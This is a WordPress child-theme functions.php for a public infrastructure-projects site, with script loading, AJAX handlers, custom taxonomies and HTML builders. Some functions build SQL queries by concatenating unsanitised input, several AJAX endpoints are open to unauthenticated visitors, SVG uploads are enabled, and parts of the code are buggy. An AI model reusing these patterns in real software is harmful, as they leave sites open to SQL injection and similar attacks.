        //wp_enqueue_script('bootstrap-table-group-by-css', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/group-by
        //    /bootstrap-table-group-by.css');
        //wp_enqueue_script('bootstrap-table-group-by-js', get_stylesheet_directory_uri() . '/assets/bootstrap-table/src/extensions/group-by
        //    /bootstrap-table-group-by.js');

    }

    if (is_page('sostenibilidad')|| is_page('sostenibilidaddos') || is_page('sostenibilidadtres') || is_page('sustainability')) {
        //Bootsratp gallery
        wp_enqueue_style('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/css/style.css', array(), '1.0.0', 'all');
        wp_enqueue_style('gallery', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise-gallery/style.css', array(), '1.0.0', 'all');

        wp_enqueue_script('gallerytether', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/tether/tether.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryscroll', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/smooth-scroll/SmoothScroll.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytouch', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/touchSwipe/jquery.touchSwipe.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerymasory', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/masonry/masonry.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryimagesloaded', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/imagesloaded/imagesloaded.pkgd.min.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('gallerytheme', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/theme/js/script.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/js/script.js', array( 'jquery' ), '1.0.0', true);

        wp_enqueue_script('my-great-script', get_template_directory_uri() . '/js/bco-js.js', array( 'jquery' ), '1.0.0', true);
        wp_enqueue_script('my-great-script2', get_template_directory_uri() . '/js/bco-ini.js', array( 'jquery' ), '1.0.0', true);        
        wp_enqueue_style('bootstrap', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/css/bootstrap.min.css');
        wp_enqueue_script('my-bootstrap-js', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/js/bootstrap.min.js');
        

        wp_enqueue_script('table-export-jspdf', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF/jspdf.min.js');
        wp_enqueue_script('table-export-jspdf-autotable', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF-AutoTable/jspdf.plugin.autotable.js');
        wp_enqueue_script('table-export-xlsx', get_stylesheet_directory_uri() . '/assets/table-export/libs/js-xlsx/xlsx.core.min.js');
        wp_enqueue_script('table-export', get_stylesheet_directory_uri() . '/assets/table-export/tableExport.min.js');


    }

}
add_action('wp_enqueue_scripts', 'theme_scripts');

// REMOVE POST META BOXES
function remove_my_post_metaboxes()
{
    // Under the Editor
    /*remove_meta_box( 'authordiv','post','normal' ); // Author Metabox
    remove_meta_box( 'commentstatusdiv','post','normal' ); // Comments Status Metabox
    remove_meta_box( 'commentsdiv','post','normal' ); // Comments Metabox
    remove_meta_box( 'postcustom','post','normal' ); // Custom Fields Metabox
    remove_meta_box( 'postexcerpt','post','normal' ); // Excerpt Metabox
    remove_meta_box( 'revisionsdiv','post','normal' ); // Revisions Metabox
    remove_meta_box( 'slugdiv','post','normal' ); // Slug Metabox
    remove_meta_box( 'trackbacksdiv','post','normal' ); // Trackback Metabox*/
    // Sidebar Options
    remove_meta_box('subsector_proyectodiv', 'proyecto_inversion', 'normal'); // Subsectores Metabox
    remove_meta_box('tagsdiv-activo_proyecto', 'proyecto_inversion', 'normal'); // Activos Metabox
    remove_meta_box('tagsdiv-accion_proyecto', 'proyecto_inversion', 'normal'); // Accion Metabox
    remove_meta_box('tagsdiv-autoridad_responsable', 'proyecto_inversion', 'normal'); // Autoridades Metabox
    remove_meta_box('tagsdiv-estados_republica', 'proyecto_inversion', 'normal'); // Estados Metabox
    remove_meta_box('tagsdiv-region_geografica', 'proyecto_inversion', 'normal'); // Regio Geo Metabox
    remove_meta_box('tagsdiv-tipo_inversion_proyecto', 'proyecto_inversion', 'normal'); // Tipo Inversion Metabox
    remove_meta_box('tagsdiv-fuente_fondeo_proyecto', 'proyecto_inversion', 'normal'); // Fondeo Metabox
    remove_meta_box('tagsdiv-etapa_proyecto', 'proyecto_inversion', 'normal'); // Etapas Metabox
    remove_meta_box('tagsdiv-subetapa_proyecto', 'proyecto_inversion', 'normal'); // Subetapas Metabox
    remove_meta_box('tagsdiv-tipo_contrato_proyecto', 'proyecto_inversion', 'normal'); // Tipos Contrato Metabox
    remove_meta_box('tagsdiv-fuente_pago_proyecto', 'proyecto_inversion', 'normal'); // Fuente pago Metabox
    remove_meta_box('tagsdiv-origen_financiamiento_proyecto', 'proyecto_inversion', 'normal'); // Origen Financiamiento Metabox
    remove_meta_box('tagsdiv-plazos_proyecto', 'proyecto_inversion', 'normal'); // Plazos Metabox
    remove_meta_box('sector_proyectodiv', 'proyecto_inversion', 'normal'); // Sector Metabox
    remove_meta_box('tagsdiv-mondea_proyecto', 'proyecto_inversion', 'normal'); // Moneda Metabox
    remove_meta_box('categoria_macroproyectodiv', 'proyecto_inversion', 'normal'); // Moneda Metabox
    remove_meta_box('authordiv', 'proyecto_inversion', 'normal'); // Autor
}
add_action('admin_menu', 'remove_my_post_metaboxes');


// Added this function to load two JS to Admin in Currency Field
function my_admin_scripts()
{
    wp_enqueue_script('my-great-script', get_template_directory_uri() . '/js/bco-js.js', array( 'jquery' ), version_id(), true);
    wp_enqueue_script('my-great-script2', get_template_directory_uri() . '/js/bco-ini.js', array( 'jquery' ), version_id(), true);
}
add_action('admin_enqueue_scripts', 'my_admin_scripts');

function acf_load_color_field_choices($field)
{
    // reset choices
    $field['choices'] = array();

    $choices = array();
    $args = array(
        'post_type' => 'post'
    );
    $postchoices = new WP_Query($args);

    // explode the value so that each line is a new array piece
    $postchoices = explode("\n", $postchoices);

    // remove any unwanted white space
    $postchoices = array_map('trim', $postchoices);

    // loop through array and add to field 'choices'
    if (is_array($postchoices)) {
        foreach ($postchoices as $postchoices) {
            $field['choices'][ $postchoices ] = $postchoices;
        }
    }

    // return the field
    return $field;
}
add_filter('acf/load_field/name=fields[field_57f680e43e112][choices]', 'acf_load_color_field_choices');

function acf_load_sample_field($field)
{
    $field['choices'] = get_post_type_values('sample_post_type');
    return $field;
}
add_filter('acf/load_field/name=sector_nvl1', 'acf_load_sample_field');

function get_post_type_values($post_type)
{
    ?>
    <style type="text/css">
        #acf-hidden {
            display: block;
        }
    </style>
    <script type="text/javascript">

        var $j = jQuery.noConflict();

        $j(function() {
            $j('#acf-field-sector_nvl1').on('change', function() {
                var selectedValue = this.value;

                var nomos_name = this.value;
                var jsonMimeType = "application/json;charset=UTF-8";

                type = 'POST';
                data = { 'parent_id': nomos_name, action : 'get_child_categories' };
                dataType = 'json';
                contentType = "application/json; charset=utf-8";
                processData = false;
                $j.post( ajaxurl, data, function(response) {
                    if( response ){
                        console.log(response);
                        var content = '';

                        var data = JSON.parse(response);
                        $j(data).each(function(key, value) {
                            content += '<option>' + value + '</option>';
                        });
                        //$j(content).appendTo("#subsector_nvl2");
                        $j("#subsector_nvl2").html(response);
                    }
                });
            });
        });
    </script>
    <?php

    $values = array();
    $parent = get_posts(array(
    'title' => 'Sectores',
    'post_type' => 'post'));
    $myparent = $parent[0]->ID;

    $defaults = array(
        'post_type' => 'post',
        'meta_query' => array(
            array(
                'key' => 'opcion_padre', // name of custom field
                'value' => '"'.$parent[0]->ID.'"', // matches exaclty "123", not just 123. This prevents a match for "1234"
                                                    //'title' => 'Energia',
                //'value' => '"'.$parent.'"',
                'compare' => 'LIKE'
            )
        )
    );

    $query = new WP_Query($defaults);

    if ($query->found_posts > 0) {
        foreach ($query->posts as $post) {
            $values[$post->ID ] = get_the_title($post->ID);
        }
    }
    return $values;
}

function get_child_sector()
{
    if (isset($_POST['parent_id'])) {
        $ID = json_decode($_POST['parent_id']);
        $type = $_POST['posttype'];
        $values = array();

        // args for the post type query
        $args = array(
            'post_type'      => '"'.$type.'"',
            'posts_per_page' => -1,
            'meta_query'     => array(
                array(
                    'key'     => 'opcion_padre', // name of custom field
                    'value'   => $ID, // matches exaclty "123", not just 123. This prevents a match for "1234"
                    'compare' => 'LIKE'
                )
            ),
            'order_by' => 'title'
        );

        $posts = get_children($args);

        foreach ($posts as $post) {
            $values[$post->ID ] = get_the_title($post->ID);
        }

        echo json_encode($values);
        //} //return $values;
    }

    die();
}
add_action('wp_ajax_get_child_subsector', 'get_child_sector');
add_action('wp_ajax_nopriv_get_child_subsector', 'get_child_sector');

function get_child_categories()
{
    wp_localize_script('nested_select', 'check_select', array(
        'ajax_url' => admin_url('admin-ajax.php')
    ));

    $choices= array();

    if ($_POST['parent_option'] != '') {
        $type = $_POST['post_type'];
        $parent = $_POST['parent_option'];
        $filter = array(
            'post_type'     => $type,
            'posts_per_page'=> -1,
            'meta_query' => array(
                array(
                    'key' => 'opcion_padre', // name of custom field
                    'value' => $parent, // matches exaclty "123", not just 123. This prevents a match for "1234"
                    'compare' => 'IN'
                )
            ),
            'order_by'      => 'title'
        );

        $posts = get_posts($filter);

        if ($posts) {
            foreach ($posts as $singlepost) {
                $choices[$singlepost->ID]=$singlepost->post_title;
            }
        }
    }
    echo json_encode($choices);

    wp_die();
}
add_action('wp_ajax_get_child_categories', 'get_child_categories');
add_action('wp_ajax_nopriv_get_child_categories', 'get_child_categories');

function acf_load_sample_field2($field)
{
    $field['choices'] = get_post_type_values2('sample_post_type');
    return $field;
}
add_filter('acf/load_field/name=subsector_nvl2', 'acf_load_sample_field2');

add_filter( 'upload_mimes', 'my_myme_types', 1, 1 );
function my_myme_types( $mime_types ) {
  $mime_types['svg'] = 'image/svg+xml';     // Adding .svg extension
  $mime_types['json'] = 'application/json'; // Adding .json extension
  
  //unset( $mime_types['xls'] );  // Remove .xls extension
  //unset( $mime_types['xlsx'] ); // Remove .xlsx extension
  
  return $mime_types;
}


function get_post_type_values2($post_type)
{
    $values = array();
    $myparent = get_field('sector_nvl1');
    echo "padre: ".$myparent;
    $defaults = array(
        'post_type' => 'post',
        'meta_query' => array(
            array(
                'key' => 'opcion_padre', // name of custom field
                'value' => '"'.$myparent.'"', // matches exaclty "123", not just 123. This prevents a match for "1234"
                                                    //'title' => 'Energia',
                'compare' => 'LIKE'
            )
        )
    );

    $query = new WP_Query($defaults);

    if ($query->found_posts > 0) {
        foreach ($query->posts as $post) {
            $values[get_the_title($post->ID)] = get_the_title($post->ID);
        }
    }

    return $values;
}

function get_value_notifications($table='', $get_campo='', $set_campo='', $value='', $post_id='57797'){
    global $wpdb;

    if($table == '')
        $table = 'postmeta';

    if($get_campo == '')
        $get_campo = 'meta_value';

    if($set_campo == '')
        $set_campo = 'meta_key';


    $data = $wpdb-> get_row('SELECT '.$get_campo.' FROM ' . $wpdb->prefix .$table.' WHERE post_id='.$post_id.' and '.$set_campo.'="'.$value.'"');    
    return $data -> $get_campo;
}

function promotor($entidad_regulatoria=0, $web='', $arreglo='', $area='', $contacto='', $email='', $lang){
    $uno = "Ir al sitio";
    $dos = "Arreglo institucional";
    $tres = "Entidad";
    $cuatro = "&Aacute;rea responsable";
    $quinto = "Contacto";
    $sexto = "Correo";    
    $titulo_entidad = get_the_title($entidad_regulatoria);
    $proyecto = get_the_title();
    if($lang=='en'){
        $uno = "Website";
        $dos = "Institutional Arrangement";
        $tres = "Entity";
        $cuatro = "Department";
        $quinto = "Contact";
        $sexto = "E-mail";        
        $titulo_entidad = get_the_title(pll_get_post($entidad_regulatoria,"en"));
        $proyecto = get_field('nombre_oficial_ingles');
    }
    $html = '
    <div class="row">
        <div class="col-md-4 hidden-xs">
            <div class="row">
                <!-- Imágenes -->
                <div class="col-md-7 col-md-offset-3 col-sm-offset-3 col-sm-6" style="padding-top:15px;">';
                $html .= get_the_post_thumbnail($entidad_regulatoria,'',array( 'class' => 'center-block'));
                $html .= '
                </div>
                <!-- Botones -->
                <div class="col-md-8 col-md-offset-2" style="padding-top:10px;">
                    <div class="row">
                        <div class="col-md-12 col-sm-10 col-sm-offset-1" style="padding-top:10px">';
                            if ( $web != '' ) { 
                                $html .='<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008688; color:#fff" target="_blank" href="'.$web.'">'.$uno.'</a>';
                            }
                        $html .='
                        </div>
                        <div class="col-md-12 col-sm-10 col-sm-offset-1" style="padding-top:20px;">';
                            if ($arreglo != '' ) {
                                $html .='<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008689; color:#fff" target="_blank" href="'.$arreglo.'">'.$dos.'</a>';
                            }
                        $html .= '
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-1 visible-lg" style="padding-top:15px;">
            <img src="/wp-content/themes/enfold-child/lineapromotor.png" class="img-fluid" alt="Responsive image">
        </div>
        <div class="col-md-7" id="idmovil" style="padding-top:20px;">
            <table class="table">                                        
                <!-- Entidad -->
                <tr>
                    <td>
                        <h5><strong>'.$tres.'</strong></h5>
                        '.$titulo_entidad.'
                    </td>
                </tr>
                <!-- ?rea responsable -->';
                if ($area != '' ) {
                    $html .='
                    <tr>
                        <td>
                            <h5><strong>'.$cuatro.'</strong></h5>
                            '.$area.'
                        </td>
                    </tr>';
                }
                $html .='
                <!-- Contacto -->';
                if ($contacto != '' ) {
                    $html .='
                    <tr>
                            <td>
                                <h5><strong>'.$quinto.'</strong></h5>
                                '.$contacto.'
                            </td>
                    </tr>';
                }
                $html .='
                <!-- Correo -->';
                if ($email != '' ) {
                    $html .='
                    <tr>
                        <td>
                            <h5><strong>'.$sexto.'</strong></h5>
                                <a href="mailto:'.$email.'?cc=proyectosmexico@banobras.gob.mx&Subject='.$proyecto.' ">'.$email.'</a>                                                            
                        </td>
                    </tr>';
                }
            $html .='
            </table>
            <!-- Botones moviles-->
            <div class="col-sm-12 visible-xs">
                <div class="row">
                    <div class="col-md-12 col-sm-12">';
                    if ($web != '' ) {
                        $html .= '<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008688; color:#fff" target="_blank" href="'.$web.'">'.$uno.'</a>';
                    }
                    $htm .='
                    </div>
                    <div class="col-md-12 col-sm-12" style="padding-top:20px;">';

                    if ( $arreglo != '' ) {
                        $html .= '<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008689; color:#fff" target="_blank" href="'.$arreglo.'">'.$dos.'</a>';
                    }
                    $html .='
                    </div>                                    
                </div>
            </div>
        </div>
    </div>';
    echo $html;                        
}

function php_qrcode($id,$texto){

    // Limpiar variable
    $id = preg_replace('/\D/', '', $id);

    //if(!empty($id) && !empty($texto)){
        require $_SERVER['DOCUMENT_ROOT'].'/observatorio/phpqrcode/qrlib.php';
        //Declaramos una carpeta temporal para guardar la imagenes generadas
        $dir = $_SERVER['DOCUMENT_ROOT'].'/wp-content/cache/tmp/resources/qrcode/';
        //Declaramos la ruta y nombre del archivo a generar
        $FileName = $dir.$id.'.png';
        //Parametros de Condiguraci?
        $tama = 150; //Tama? de Pixel
        $level = 'L'; //Precisi? Baja
        $framSize = 0; //Tama? en blanco
        $url_page = $texto;

        //Enviamos los parametros a la Funcion para generar coigo QR 
        QRcode::png($url_page, $FileName, $level, $tama, $framSize);
    //}
}

function parametrizable_txt($id, $id_menu=0, $lang){
    $Query  = "SELECT descripcion_es, descripcion_en FROM tbl_textos_pdf WHERE idtexto=".$id;
    if(!empty($id_menu))
        $Query .= " and id_menu=".$id_menu;
    $conn = new conexion();
    $conM = $conn->conexionMysql();
    $result = $conM->query($Query);
    $texto = "";
    while ($row = $result->fetch_assoc()) {
        $texto = $row['descripcion_es'];
        if($lang=='EN')
            $texto = $row['descripcion_en'];
    }
    return $texto;
}


$URL = $_SERVER['DOCUMENT_ROOT']."/observatorio/conexion/conexion.php";
include_once($URL);
include 'bmxt-project-cache.php';
include 'vehiculos-cache.php';
include 'archived-project-cache.php';
include 'random.php';
include 'sostenibilidad.php';
include 'funciones_exportpdf.php';
include 'random/exportpdf.php';
include 'random_en/exportpdf.php';
include 'vehiculo/exportpdf.php';
include 'vehiculo_en/exportpdf.php';
include 'api.php';



function cargar_accesibilidad_local() {
    // Asegúrate de que jQuery esté disponible
    wp_enqueue_script('jquery');

    // Enlazar CSS local
    wp_enqueue_style(
        'accesibilidad-css',
        get_stylesheet_directory_uri() . '/css/accesibilidad.min.css',
        array(),
        null
    );

    // Enlazar JS local (después de jQuery)
    wp_enqueue_script(
        'accesibilidad-js',
        get_stylesheet_directory_uri() . '/js/accesibilidad.min.js',
        array('jquery'),
        null,
        true
    );
}
add_action('wp_enqueue_scripts', 'cargar_accesibilidad_local');








// ** Presidencia Footer **/

function insertar_footer_presidencia() {
    ?>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Crear contenedor principal
            var contenedor = document.createElement('div');
            contenedor.id = 'contenido-footer-html';
            contenedor.style.width = '100%';
            contenedor.style.overflow = 'hidden';
            contenedor.style.margin = '0';
            contenedor.style.padding = '0';
            contenedor.style.boxSizing = 'border-box';

            // Crear Shadow DOM
            var shadowRoot = contenedor.attachShadow({ mode: 'open' });

            // Cargar contenido del footer externo
            fetch('/wp-content/themes/enfold-child/footer.html')
                .then(function(response) {
                    return response.text();
                })
                .then(function(html) {
                    shadowRoot.innerHTML = html;

                    // Ejecutar scripts dentro del HTML cargado (si los hay)
                    var scripts = shadowRoot.querySelectorAll('script');
                    scripts.forEach(function(script) {
                        var nuevoScript = document.createElement('script');
                        if (script.src) {
                            nuevoScript.src = script.src;
                        } else {
                            nuevoScript.textContent = script.textContent;
                        }
                        shadowRoot.appendChild(nuevoScript);
                    });
                })
                .catch(function(error) {
                    console.error('Error al cargar el contenido del footer:', error);
                });

            // Agregar el contenedor al pie del body
            document.body.appendChild(contenedor);
        });
    </script>
    <?php
}

add_action('wp_footer', 'insertar_footer_presidencia', 100);


// ** Presidencia Header **/


// functions.php

function insertar_iframe_en_header_meta() {
    ?>
    <script>
    document.addEventListener("DOMContentLoaded", function() {
       
	  

        var headerMeta = document.getElementById('header_meta');
        if (headerMeta) {
            // Crear un contenedor host para Shadow DOM
            var host = document.createElement('div');
            host.id = 'shadow-host-header';
            host.style.width = '100%';
            host.style.height = '55px';

            // Crear shadow root
            var shadow = host.attachShadow({mode: 'open'});

            // Cargar el HTML dentro del shadow root
            fetch('/wp-content/themes/enfold-child/header.html')
                .then(response => response.text())
                .then(html => {
                    shadow.innerHTML = html;
					
					
                })
                .catch(error => {
                    console.error('Error al cargar el contenido del header:', error);
                });

            headerMeta.insertBefore(host, headerMeta.firstChild);
        }
    });
    </script>
    <?php
}
add_action('wp_head', 'insertar_iframe_en_header_meta');




// Taxonomía: Sector
register_taxonomy('sector_proyecto_p', 'proyecto_prioritario', [
    'label' => 'Sector P', // Nombre que se mostrará en el admin
    'hierarchical' => false, // false: funciona como etiquetas (tags), true: como categorías jerárquicas
    'public' => true, // visible en el frontend
    'rewrite' => ['slug' => 'sector_p'], // slug en URL
	 'show_ui' => true // muestra la interfaz en el admin de WordPress
]);

// Taxonomía: Subsector
register_taxonomy('subsector_proyecto_p', 'proyecto_prioritario', [
    'label' => 'Subsector P',
    'hierarchical' => false,
    'public' => true,
    'rewrite' => ['slug' => 'subsector_p'],
	'show_ui' => true // <-- asegúrate de tener esto
]);


add_action('wp_ajax_get_subsectores_by_sector', 'get_subsectores_by_sector');
add_action('wp_ajax_nopriv_get_subsectores_by_sector', 'get_subsectores_by_sector');

function get_subsectores_by_sector() {
	error_log('Sector ID recibido: ' . print_r($_POST['sector_id'], true));
    $sector_id = intval($_POST['sector_id']);

    $subsectores = get_terms([
        'taxonomy' => 'subsector_proyecto_p',
        'hide_empty' => false,
      'meta_query' => [
            [
                'key' => 'sector_relacionado',
                //'value' => '"' . $sector_id . '"',
				'value' =>$sector_id,
                'compare' => '='
				
            ]
        ]
    ]);

    $data = [];
    foreach ($subsectores as $sub) {
        $data[] = [
            'term_id' => $sub->term_id,
            'name' => $sub->name
        ];
    }

    wp_send_json_success($data);
}

function cargar_js_sector_subsector() {
    wp_enqueue_script(
        'sectores-subsectores', // nombre identificador
        get_stylesheet_directory_uri() . '/js/sectores-subsectores.js', // ruta al script
        array('jquery'), // dependencia
        null, // versión (puedes usar '1.0' o null)
        true // cargar en footer
    );

    // Enviamos la URL de admin-ajax.php al JS
    wp_localize_script('sectores-subsectores', 'ajax_sector', array(
        'ajaxurl' => admin_url('admin-ajax.php')
    ));
}
add_action('wp_enqueue_scripts', 'cargar_js_sector_subsector');

function shortcode_selector_sectores() {
    ob_start(); // Inicia buffer para capturar el HTML
    ?>
    <select id="sector-select">
        <option value="">Selecciona un sector</option>
        <?php
        $sectores = get_terms(array(
            'taxonomy' => 'sector_proyecto_p',
            'hide_empty' => false
        ));
        foreach ($sectores as $sector) {
            echo '<option value="' . esc_attr($sector->term_id) . '">' . esc_html($sector->name) . '</option>';
        }
        ?>
    </select>

    <select id="subsector-select" disabled>
        <option value="">Selecciona un subsector</option>
    </select>
    <?php
    return ob_get_clean(); // Devuelve el contenido como salida del shortcode
}
add_shortcode('selector_sectores', 'shortcode_selector_sectores');


// solo para visualizar id de sectpr
add_action('wp_ajax_get_sectores', 'get_sectores');


function get_sectores() {
    $sectores = get_terms(array(
        'taxonomy' => 'sector_proyecto_p',
        'hide_empty' => false
    ));

    $data = array();
    foreach ($sectores as $sector) {
        $data[] = array(
            'term_id' => $sector->term_id,
            'name' => $sector->name
        );
    }

    wp_send_json_success($data);
}


//Agrega un campo en el panel de administración al editar subsectores
add_action('subsector_proyecto_p_edit_form_fields', 'mostrar_sector_relacionado_en_subsector');
function mostrar_sector_relacionado_en_subsector($term) {
    $valor = get_term_meta($term->term_id, 'sector_relacionado', true);
    $sectores = get_terms(array(
        'taxonomy' => 'sector_proyecto_p',
        'hide_empty' => false
    ));
    ?>
    <tr class="form-field">
        <th scope="row"><label for="sector_relacionado">Sector relacionado B</label></th>
        <td>
            <select name="sector_relacionado" id="sector_relacionado">
                <option value="">— Selecciona —</option>
                <?php foreach ($sectores as $sector): ?>
                    <option value="<?php echo esc_attr($sector->term_id); ?>" <?php selected($valor, $sector->term_id); ?>>
                        <?php echo esc_html($sector->name); ?>
                    </option>
                <?php endforeach; ?>
            </select>
        </td>
    </tr>
    <?php
}

//Agrega un campo en el panel de administración al crear
add_action('subsector_proyecto_p_add_form_fields', 'agregar_sector_relacionado_nuevo_subsector');
function agregar_sector_relacionado_nuevo_subsector($taxonomy) {
    $sectores = get_terms(array(
        'taxonomy' => 'sector_proyecto_p',
        'hide_empty' => false
    ));
    ?>
    <div class="form-field">
        <label for="sector_relacionado">Sector relacionado B</label>
        <select name="sector_relacionado" id="sector_relacionado">
            <option value="">— Selecciona —</option>
            <?php foreach ($sectores as $sector): ?>
                <option value="<?php echo esc_attr($sector->term_id); ?>"><?php echo esc_html($sector->name); ?></option>
            <?php endforeach; ?>
        </select>
    </div>
    <?php
}

add_action('create_subsector_proyecto_p', 'guardar_sector_relacionado_en_subsector');


//Guardar el metadato al actualizar el término
add_action('edited_subsector_proyecto_p', 'guardar_sector_relacionado_en_subsector');
function guardar_sector_relacionado_en_subsector($term_id) {
    if (isset($_POST['sector_relacionado'])) {
        update_term_meta($term_id, 'sector_relacionado', intval($_POST['sector_relacionado']));
    }
}


// Oculta las cajas estándar de taxonomías
add_action('admin_menu', function() {
    remove_meta_box('tagsdiv-sector_proyecto_p', 'proyecto_prioritario', 'side');
    remove_meta_box('tagsdiv-subsector_proyecto_p', 'proyecto_prioritario', 'side');
});


//Agrega la nueva caja con select sector/subsector
add_action('add_meta_boxes', function() {
    add_meta_box(
        'sector_subsector_custom',
        'Sector y Subsector',
        'render_sector_subsector_box',
        'proyecto_prioritario',
        'side',
        'default'
    );
});

function render_sector_subsector_box($post) {
    // Obtener términos actuales del post
    $sector_actual = wp_get_post_terms($post->ID, 'sector_proyecto_p', ['fields' => 'ids']);
    $subsector_actual = wp_get_post_terms($post->ID, 'subsector_proyecto_p', ['fields' => 'ids']);

    $sectores = get_terms(['taxonomy' => 'sector_proyecto_p', 'hide_empty' => false]);
    $subsectores = get_terms(['taxonomy' => 'subsector_proyecto_p', 'hide_empty' => false]);

    // Campo select para SECTOR
    echo '<label for="custom_sector_select">Sector:</label>';
    echo '<select name="custom_sector_select" id="custom_sector_select" class="widefat">';
    echo '<option value="">Selecciona un sector</option>';
    foreach ($sectores as $sector) {
        $selected = (in_array($sector->term_id, $sector_actual)) ? 'selected' : '';
        echo '<option value="' . esc_attr($sector->term_id) . '" ' . $selected . '>' . esc_html($sector->name) . '</option>';
    }
    echo '</select>';

    // Campo select para SUBSECTOR (todos inicialmente)
    echo '<label for="custom_subsector_select">Subsector:</label>';
    echo '<select name="custom_subsector_select" id="custom_subsector_select" class="widefat">';
    echo '<option value="">Selecciona un subsector</option>';
    foreach ($subsectores as $sub) {
        $sector_rel = get_term_meta($sub->term_id, 'sector_relacionado', true);
        $selected = (in_array($sub->term_id, $subsector_actual)) ? 'selected' : '';
        echo '<option value="' . esc_attr($sub->term_id) . '" data-sector="' . esc_attr($sector_rel) . '" ' . $selected . '>' . esc_html($sub->name) . '</option>';
    }
    echo '</select>';

    // Script para filtrar subsectores según sector
    ?>
    <script>
    jQuery(document).ready(function($) {
        function filtrarSubsectores() {
            var sectorID = $('#custom_sector_select').val();
            $('#custom_subsector_select option').each(function() {
                var relatedSector = $(this).data('sector');
                if (!relatedSector || sectorID === '' || relatedSector == sectorID) {
                    $(this).show();
                } else {
                    $(this).hide();
                }
            });
        }

        $('#custom_sector_select').on('change', function() {
            filtrarSubsectores();
            $('#custom_subsector_select').val('');
        });

        filtrarSubsectores(); // inicial
    });
    </script>
    <?php
}

//Guarda los valores al guardar el post
add_action('save_post', function($post_id) {
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) return;

    if (isset($_POST['custom_sector_select'])) {
        $sector_id = intval($_POST['custom_sector_select']);
        wp_set_post_terms($post_id, [$sector_id], 'sector_proyecto_p', false);
    }

    if (isset($_POST['custom_subsector_select'])) {
        $subsector_id = intval($_POST['custom_subsector_select']);
        wp_set_post_terms($post_id, [$subsector_id], 'subsector_proyecto_p', false);
    }
});


//shorcode
function mostrar_sector_subsector_shortcode($atts) {
    if (!is_singular('proyecto_prioritario')) return '';

    $post_id = get_the_ID();

    $sectores = wp_get_post_terms($post_id, 'sector_proyecto_p');
    $subsectores = wp_get_post_terms($post_id, 'subsector_proyecto_p');

    $output = '<div class="info-sector-subsector">';
    if (!empty($sectores)) {
        $output .= '<p><strong>Sector:</strong> ' . esc_html($sectores[0]->name) . '</p>';
    }
    if (!empty($subsectores)) {
        $output .= '<p><strong>Subsector:</strong> ' . esc_html($subsectores[0]->name) . '</p>';
    }
    $output .= '</div>';

    return $output;
}
add_shortcode('mostrar_sector_subsector', 'mostrar_sector_subsector_shortcode');



//administrador de campos

// Crear página de opciones
add_action('admin_menu', function() {
    add_menu_page(
        'Campos de Visibilidad',
        'Campos Visibilidad',
        'manage_options',
        'campos-visibilidad',
        'campos_visibilidad_admin_page',
        'dashicons-visibility',
        100
    );
});

// Renderizar la página
function campos_visibilidad_admin_page() {
    // Encolar jQuery UI Sortable en el admin
    function enqueue_sortable_script() {
        wp_enqueue_script('jquery-ui-sortable');
    }
    add_action('admin_enqueue_scripts', 'enqueue_sortable_script');

    // Obtener campos guardados
    $campos = get_option('campos_visibilidad_proyecto', []);

    // Guardar si se envió el formulario
    if (isset($_POST['campos_visibilidad_nonce']) && wp_verify_nonce($_POST['campos_visibilidad_nonce'], 'guardar_campos_visibilidad')) {
        $nuevos_campos = [];

        if (!empty($_POST['campo_key']) && !empty($_POST['campo_label'])) {
            foreach ($_POST['campo_key'] as $i => $key) {
                $key = sanitize_text_field($key);
                $label = sanitize_text_field($_POST['campo_label'][$i]);
                if ($key && $label) {
                    $nuevos_campos[$key] = $label;
                }
            }
        }

        update_option('campos_visibilidad_proyecto', $nuevos_campos);
        $campos = $nuevos_campos;
        echo '<div class="updated"><p>Campos guardados correctamente.</p></div>';
    }
    ?>
    <div class="wrap">
        <h1>Editar campos de visibilidad</h1>
        <form method="post">
            <?php wp_nonce_field('guardar_campos_visibilidad', 'campos_visibilidad_nonce'); ?>
            <table class="form-table" id="campos-table">
                <thead>
                    <tr>
                        <th>Nombre del campo (key)</th>
                        <th>Etiqueta (label)</th>
                        <th>Eliminar</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($campos as $key => $label): ?>
                        <tr>
                            <td><input type="text" name="campo_key[]" value="<?php echo esc_attr($key); ?>"></td>
                            <td><input type="text" name="campo_label[]" value="<?php echo esc_attr($label); ?>"></td>
                            <td><button type="button" class="button eliminar-fila">✖</button></td>
                        </tr>
                    <?php endforeach; ?>
                    <tr>
                        <td><input type="text" name="campo_key[]"></td>
                        <td><input type="text" name="campo_label[]"></td>
                        <td><button type="button" class="button eliminar-fila">✖</button></td>
                    </tr>
                </tbody>
            </table>
            <p><button type="button" class="button" id="agregar-fila">+ Agregar campo</button></p>
            <p><input type="submit" class="button button-primary" value="Guardar"></p>
